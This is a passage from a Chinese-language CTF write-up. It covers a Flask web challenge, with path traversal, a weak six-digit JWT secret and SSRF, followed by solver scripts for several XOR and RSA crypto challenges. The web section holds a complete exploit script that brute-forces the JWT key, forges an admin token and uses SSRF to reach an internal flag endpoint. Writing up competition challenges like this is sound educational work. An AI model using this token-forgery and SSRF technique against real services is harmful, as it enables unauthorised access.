                           "bin", "lib", "tmp", "var", "run", "dev", "home", "boot"]
    if any(keyword in file for keyword in restricted_keywords):
        return make_response("STOP!", 404)
    if not os.path.exists("./static/" + file):
        return make_response("Not found!", 404)
    return send_file("./static/" + file)


if __name__ == '__main__':
    app.run(host="0.0.0.0",port=5000)
```

本题的漏洞代码是 `send_file("./static/" + file)`.

与 SQL 注入一样，直接拼接用户可控制输入的字符串是大忌！

通过审计源码，我们知道要用admin用户来登录面板，两种方法：获取密码或者伪造 `token`.

而伪造token需要用到secret_key，我们查看生成逻辑

```
secret_key = get_random_number_string(6)
```

6位数数字字符串，很快就能爆破

```
users = {
    'admin': admin_pass,
    'amiya': "114514"
}
```

我们在这发现，有一个有效的用户amiya，密码是114514，通过登录，我们可以获得一个有效的token，据此能在本地认证签名 `secret_key` 的有效性（因为目标主机有认证次数限制）。

先爆破出secret_key，然后查看登录后的逻辑：

前端请求 `/execute` 指定 `api_address`，而 `api_address` 可控且没有校验，存在 SSRF 漏洞。

定位到源代码开头：

python

```
from flag import get_random_number_string
```

这是出题人故意漏的信息，将函数写在了 flag 模块并 import，提示查看 `flag.py`

![image-20241031195919893](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410311959058.png)

```
@get_flag.route("/fl4g")
# 如何触发它呢?
def flag():
    return FLAG
```

TIP

Python 程序可以 import 同一目录下的 `.py` 文件而不必创建 `__init__.py` 等标记模块的文件。因此这里同级目录下有文件名为 `flag.py` 的程序，模块名为 `flag`.

我们的操作很明确了：利用 `/execute` 路由的 SSRF 漏洞让服务器自己访问 `http://localhost:5001/fl4g`，即访问 `/execute?api_address=http://localhost:5001/fl4g`.

EXP 如下：

```
import time
import requests
import jwt
import sys

if len(sys.argv) < 2:
    print(f"Usage: python {sys.argv[0]} <url>")
    sys.exit(1)

url = sys.argv[-1]


def get_number_string(number,length):
    return str(number).zfill(length)

print("[+] Exploit for newstar-zhezhaopianshinima")
print("[+] Getting a valid token from the server")

LENGTH = 6
req = requests.post(url+"/login", data={"username":"amiya","password":"114514"})
token = req.cookies.get("token")

print(f"[+] Got token: {token}")
print("[+] Brute forcing the secret key")
for i in range(1000000):
    secret_key = get_number_string(i,LENGTH)
    try:
        decoded = jwt.decode(token, secret_key, algorithms=["HS256"])
        break
    except jwt.exceptions.InvalidSignatureError:
        continue

print(f"[+] Found secret key: {secret_key}")
fake_token = jwt.encode({'user': 'admin', 'exp': int(time.time()) + 600}, secret_key)

print(f"[+] Generated a fake token: {fake_token}")

print("[+] Getting the flag")
req = requests.get(url+"/execute?api_address=http://localhost:5001/fl4g", cookies={"token":fake_token})

print(f"[+] Flag: {req.text}")
```

![image-20241031200436735](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202410312004780.png)







## Crypto

### Base

![image-20240930150338588](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301503665.png)

我们把编码放CyberChef里解一下就出了

![image-20240930150415482](https://insey.oss-cn-shenzhen.aliyuncs.com/kin/202409301504602.png)

### xor

```
from pwn import xor
from Crypto.Util.number import long_to_bytes,bytes_to_long

key = b'New_Star_CTF'

# 使用之前的 c1 和 c2 值
c1 = 8091799978721254458294926060841
c2 = b';:\x1c1<\x03>*\x10\x11u;'

# 解密 m1
m1 = long_to_bytes(c1 ^ bytes_to_long(key))

# 解密 m2
m2 = xor(key, c2)

# 拼接得到完整的 flag
flag = m1 + m2
print(flag.decode('utf-8'))

```

得到flag



### 一眼秒了

简单的rsa

```
from Crypto.Util.number import long_to_bytes
from gmpy2 import invert

e = 65537
n= 52147017298260357180329101776864095134806848020663558064141648200366079331962132411967917697877875277103045755972006084078559453777291403087575061382674872573336431876500128247133861957730154418461680506403680189755399752882558438393107151815794295272358955300914752523377417192504702798450787430403387076153
c= 48757373363225981717076130816529380470563968650367175499612268073517990636849798038662283440350470812898424299904371831068541394247432423751879457624606194334196130444478878533092854342610288522236409554286954091860638388043037601371807379269588474814290382239910358697485110591812060488786552463208464541069
p=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956044421
q=7221289171488727827673517139597844534869368289455419695964957239047692699919030405800116133805855968123601433247022090070114331842771417566928809956045093

d=invert(e,(p-1)*(q-1))
m=pow(c,d,n)
print(long_to_bytes(m))
```

### 这是几次方？ 疑惑！

这个题我们直接用yafu分解n秒了

```
from Crypto.Util.number import long_to_bytes
from gmpy2 import invert

e = 65537
c = 36513006092776816463005807690891878445084897511693065366878424579653926750135820835708001956534802873403195178517427725389634058598049226914694122804888321427912070308432512908833529417531492965615348806470164107231108504308584954154513331333004804817854315094324454847081460199485733298227480134551273155762
n=124455847177872829086850368685666872009698526875425204001499218854100257535484730033567552600005229013042351828575037023159889870271253559515001300645102569745482135768148755333759957370341658601268473878114399708702841974488367343570414404038862892863275173656133199924484523427712604601606674219929087411261
p=9894080171409167477731048775117450997716595135307245061889351408996079284609420327696692120762586015707305237750670080746600707139163744385937564246995541
q=12578819356802034679792891975754306960297043516674290901441811200649679289740456805726985390445432800908006773857670255951581884098015799603908242531598921
d=invert(e,(p-1)*(q-1))
print(p*q)
m=pow(c,d,n)
print(long_to_bytes(m))

//flag{yihuo_yuan_lai_xian_ji_suan_liang_bian_de2333}
```

### Since you konw something

```
from pwn import xor
#The Python pwntools library has a convenient xor() function that can XOR together data of different types and lengths
from Crypto.Util.number import bytes_to_long

key = ?? #extremely short
FLAG = 'flag{????????}'
c = bytes_to_long(xor(FLAG,key))

print("c={}".format(c))

'''
c=218950457292639210021937048771508243745941011391746420225459726647571
'''
```

这个题它提示key很短，那我们可以进行爆破

```
from pwn import xor
from Crypto.Util.number import long_to_bytes
import itertools

# 已知密文
c = 218950457292639210021937048771508243745941011391746420225459726647571

# 将密文转换为字节
cipher_bytes = long_to_bytes(c)

# 设定可能的密钥长度（假设1到4字节）
for key_length in range(1, 5):
    # 生成所有可能的密钥组合（每个字节从0到255）
    for key_tuple in itertools.product(range(256), repeat=key_length):
        # 将元组转换为字节类型的密钥
        key = bytes(key_tuple)

        # 使用 pwntools 的 xor 函数解密
        decrypted_message = xor(cipher_bytes, key)

        # 检查解密后的消息是否包含 "flag"
        if b"flag" in decrypted_message:
            print(f"找到密钥: {key}")
            print(f"解密后的FLAG: {decrypted_message.decode()}")
            break
            
//flag{Y0u_kn0w_th3_X0r_b3tt3r}
```

### Just one and more than two

```
from Crypto.Util.number import *
from sympy import mod_inverse

# 给定的加密参数
p = 11867061353246233251584761575576071264056514705066766922825303434965272105673287382545586304271607224747442087588050625742380204503331976589883604074235133
q = 11873178589368883675890917699819207736397010385081364225879431054112944129299850257938753554259645705535337054802699202512825107090843889676443867510412393
r = 12897499208983423232868869100223973634537663127759671894357936868650239679942565058234189535395732577137079689110541612150759420022709417457551292448732371
c1 = 8705739659634329013157482960027934795454950884941966136315983526808527784650002967954059125075894300750418062742140200130188545338806355927273170470295451
c2 = 1004454248332792626131205259568148422136121342421144637194771487691844257449866491626726822289975189661332527496380578001514976911349965774838476334431923162269315555654716024616432373992288127966016197043606785386738961886826177232627159894038652924267065612922880048963182518107479487219900530746076603182269336917003411508524223257315597473638623530380492690984112891827897831400759409394315311767776323920195436460284244090970865474530727893555217020636612445

# RSA 参数
e = 65537

# 计算 φ(N)
phi_N = (p - 1) * (q - 1) * (r - 1)

# 计算 d
d = mod_inverse(e, phi_N)

# 解密 m1 和 m2
m1 = pow(c1, d, p)
m2 = pow(c2, d, p * q * r)

# 将解密结果转回字节
flag_bytes = long_to_bytes(m1) + long_to_bytes(m2)
flag = flag_bytes.decode('utf-8')

print("解密后的 flag:", flag)
```

